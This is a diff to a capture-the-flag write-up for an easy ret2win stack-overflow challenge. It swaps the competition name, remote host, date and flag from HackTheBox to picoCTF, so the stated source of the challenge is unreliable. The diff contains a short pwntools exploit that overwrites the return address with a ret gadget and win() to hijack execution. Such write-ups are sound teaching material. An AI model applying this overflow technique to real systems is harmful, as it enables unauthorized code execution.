@@ -1,10 +1,10 @@
 ---
 title: "ret2win — Orbital Mechanics of the Stack"
-ctf: "HackTheBox CyberApocalypse"
+ctf: "picoCTF 2024"
 category: "pwn"
 difficulty: "easy"
-points: 200
-date: "2026-03-03"
+points: 100
+date: "2024-03-03"
 lat: 51.5
 lng: -0.12
 summary: "Hijacking RIP and slingshotting execution into a hidden win() function. Mind the 16-byte alignment."
@@ -31,7 +31,7 @@ Simply jumping to `win` segfaults inside `system` because of `movaps` instructio
 from pwn import *
 
 elf = ELF("./vuln")
-io = remote("orbital.htb", 1337)
+io = remote("orbital.picoctf.net", 1337)
 
 ret = 0x40101a  # ret gadget
 payload = b"A"*72 + p64(ret) + p64(elf.sym.win)
@@ -39,4 +39,4 @@ io.sendline(payload)
 io.interactive()
 ```
 
-**Flag:** `HTB{r3t_2_w1n_4lign3d}`
+**Flag:** `picoCTF{r3t_2_w1n_4lign3d}`
